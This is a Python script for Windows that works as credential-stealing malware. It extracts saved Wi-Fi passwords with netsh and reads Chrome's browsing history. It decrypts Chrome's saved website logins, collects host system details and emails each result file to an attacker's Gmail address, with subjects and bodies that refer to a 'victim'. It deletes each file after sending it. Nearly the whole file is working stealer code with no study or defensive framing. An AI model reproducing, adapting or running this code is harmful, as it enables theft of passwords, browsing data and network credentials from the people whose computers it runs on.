#!/usr/bin/python
import smtplib
import base64, os, sys, re
import sqlite3
import socket
import platform
import uuid

sender = 'youremail@gmail.com'
reciever = 'email@gmail.com'
password = 'password'
# Dont change this
marker = "AUNIQUEMARKER"


def wifipass():
   def get_wlans():
      data = os.popen("netsh wlan show profiles").read()
      wifi = re.compile("All User Profile\s*:.(.*)")
      return wifi.findall(data)

   def get_pass(network):
      try:
         wlan = os.popen("netsh wlan show profile "+str(network.replace(" ","*"))+" key=clear").read()
         pass_regex = re.compile("Key Content\s*:.(.*)")
         return pass_regex.search(wlan).group(1)
      except:
         return " "

   f = open("wifi.txt","w")
   for wlan in get_wlans():
       f.write("-----------\n"+" SSID : "+wlan + "\n Password : " + get_pass(wlan))
   f.close()

wifipass()

################ CHROME ################
################  CODE  ################
################  HERE  ################
def history():
   import operator
   from collections import OrderedDict
#import matplotlib.pyplot as plt

   def parse(url):
           try:
                   parsed_url_components = url.split('//')
                   sublevel_split = parsed_url_components[1].split('/', 1)
                   domain = sublevel_split[0].replace("www.", "")
                   return domain
           except IndexError:
                   print "URL format error!"

   def analyze(results):
      b=open("chrome1.txt","w")
      for site, count in sites_count_sorted.items():
         #print site, count
         b.write(site + "\n")
#path to user's history database (Chrome)
      b.close()
   data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
   files = os.listdir(data_path)
   history_db = os.path.join(data_path, 'history')
#querying the db
   c = sqlite3.connect(history_db)
   cursor = c.cursor()
   select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
   cursor.execute(select_statement)
   results = cursor.fetchall() 
   sites_count = {} 
   for url, count in results:
           url = parse(url)
           if url in sites_count:
                   sites_count[url] += 1
           else:
                   sites_count[url] = 1
   sites_count_sorted = OrderedDict(sorted(sites_count.items(), key=operator.itemgetter(1), reverse=True))
   analyze (sites_count_sorted)
################ CHROME ################
################  CODE  ################
################  HERE  ################
history()
def chrome():
   import os,sqlite3,win32crypt
   data=os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
   connection = sqlite3.connect(data)
   cursor = connection.cursor()
   cursor.execute('SELECT action_url, username_value, password_value FROM logins')
   final_data=cursor.fetchall()
   a=open("chrome.txt","w")
   a.write("Extracted chrome passwords :\n")
   for website_data in final_data:
       password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
       one="Website  : "+str(website_data[0])
       two="Username : "+str(website_data[1])
       three="Password : "+str(password)
       a.write(one+"\n"+two+"\n"+three)
       a.write("\n"+"====="*10+"\n")
   a.close()

chrome()

################  EMAIL ################
################  CODE  ################
################  HERE  ################
filename = "wifi.txt"
fo = open(filename, "rb")
filecontent = fo.read()
encodedcontent = base64.b64encode(filecontent)

body = """
New stuff info from victim
""" 
part1 = """From: Victim <Victim@gmail.com>
To: Filip <toxicnull@gmail.com>
Subject: Victim wifi
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=%s
--%s
""" % (marker, marker)

part2 = """Content-Type: text/plain
Content-Transfer-Encoding:8bit

%s
--%s
""" % (body,marker)

part3 = """Content-Type: multipart/mixed; name=\"%s\"
Content-Transfer-Encoding:base64
Content-Disposition: attachment; filename=%s

%s
--%s--
""" %(filename, filename, encodedcontent, marker)

message = part1 + part2 + part3

try:
   smtpObj = smtplib.SMTP('smtp.gmail.com:587')
   smtpObj.starttls()
   smtpObj.login(sender, password)
   smtpObj.sendmail(sender, reciever, message)
   fo.close()
   os.remove("wifi.txt")
except Exception:
   print "Error: unable to send email"
#################################################
filename = "chrome1.txt"
fo1 = open(filename, "rb")
filecontent = fo1.read()
encodedcontent = base64.b64encode(filecontent)

body = """
New stuff info from victim - History
"""
part1 = """From: Victim <Victim@gmail.com>
To: Filip <toxicnull@gmail.com>
Subject: Victim chrome history
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=%s
--%s
""" % (marker, marker)

part2 = """Content-Type: text/plain
Content-Transfer-Encoding:8bit

%s
--%s
""" % (body,marker)

part3 = """Content-Type: multipart/mixed; name=\"%s\"
Content-Transfer-Encoding:base64
Content-Disposition: attachment; filename=%s

%s
--%s--
""" %(filename, filename, encodedcontent, marker)

message = part1 + part2 + part3

try:
   smtpObj = smtplib.SMTP('smtp.gmail.com:587')
   smtpObj.starttls()
   smtpObj.login(sender, password)
   smtpObj.sendmail(sender, reciever, message)
   #print "Successfully sent email"
   fo1.close()
   os.remove("chrome1.txt")
except Exception:
   print "Error: unable to send email"
###########################################
filename = "chrome.txt"
fo = open(filename, "rb")
filecontent = fo.read()
encodedcontent = base64.b64encode(filecontent)

body = """
New stuff info from victim
===========================
Name: %s
FQDN: %s
System Platform: %s
Machine: %s
Node: %s
Platform: %s
Pocessor: %s
System OS: %s
Release: %s
Version: %s
""" % (socket.gethostname(), socket.getfqdn(), sys.platform,platform.machine(),platform.node(),platform.platform(),platform.processor(),platform.system(),platform.release(),platform.version()) ###########
part1 = """From: Victim <Victim@gmail.com>
To: Filip <toxicnull@gmail.com>
Subject: Victim saved pass
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=%s
--%s
""" % (marker, marker)

part2 = """Content-Type: text/plain
Content-Transfer-Encoding:8bit

%s
--%s
""" % (body,marker)

part3 = """Content-Type: multipart/mixed; name=\"%s\"
Content-Transfer-Encoding:base64
Content-Disposition: attachment; filename=%s

%s
--%s--
""" %(filename, filename, encodedcontent, marker)

message = part1 + part2 + part3

try:
   smtpObj = smtplib.SMTP('smtp.gmail.com:587')
   smtpObj.starttls()
   smtpObj.login(sender, password)
   smtpObj.sendmail(sender, reciever, message)
   fo.close()
   os.remove("chrome.txt")
except Exception:
   print "Error: unable to send email"
   
